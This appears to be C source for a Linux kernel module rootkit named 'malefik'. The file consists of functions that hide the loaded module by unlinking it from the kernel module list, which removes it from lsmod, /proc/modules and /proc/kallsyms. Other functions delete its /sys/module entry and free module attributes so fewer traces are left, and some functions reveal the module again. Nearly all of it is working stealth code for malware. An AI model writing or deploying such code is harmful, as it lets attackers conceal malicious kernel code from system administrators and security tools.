#include <linux/init.h>		
#include <linux/module.h>	
#include <linux/kernel.h>	
#include <linux/list.h>		
#include <linux/slab.h>		

static struct list_head *prev_module_in_proc_modules_lsmod;

int is_hidden_proc = 0;
int is_hidden_sys = 0;

static void proc_lsmod_malefik_hide(void)
{
	if (is_hidden_proc)
	{
		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM is already hidden from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");
		return;
	}
	prev_module_in_proc_modules_lsmod = THIS_MODULE->list.prev;
	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding LKM from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");
	list_del(&THIS_MODULE->list);

	is_hidden_proc = 1;
}

static void sys_module_malefik_hide(void)
{
        if (is_hidden_sys)
        {
        	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM is already hidden from `/sys/module/malefik/` directory \n");
                return;
        }

        printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding LKM from `/sys/module/malefik/` directory \n");

 	kobject_del(&THIS_MODULE->mkobj.kobj);
        is_hidden_sys = 1;
}

static void proc_lsmod_malefiik_show(void)
{
	if (!is_hidden_proc)
	{
		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM is already revealed to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
		return;
	}
	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ revealing LKM to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
	list_add(&THIS_MODULE->list, prev_module_in_proc_modules_lsmod);
	
	is_hidden_proc = 0;
}


static void sys_module_malefik_show(void)
{
	if (!is_hidden_sys)
	{
		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM already revealed to `/sys/module/malefik/` directory \n");
		return;
	}

	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ revealing LKM to `/sys/module/malefik/` directory \n");
	is_hidden_sys = 0;
}

static inline void tidy(void)
{
	kfree(THIS_MODULE->notes_attrs);
	THIS_MODULE->notes_attrs = NULL;
	
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	
	kfree(THIS_MODULE->mkobj.mp);
	THIS_MODULE->mkobj.mp = NULL;
	THIS_MODULE->modinfo_attrs->attr.name = NULL;
	
	kfree(THIS_MODULE->mkobj.drivers_dir);
	THIS_MODULE->mkobj.drivers_dir = NULL;
}

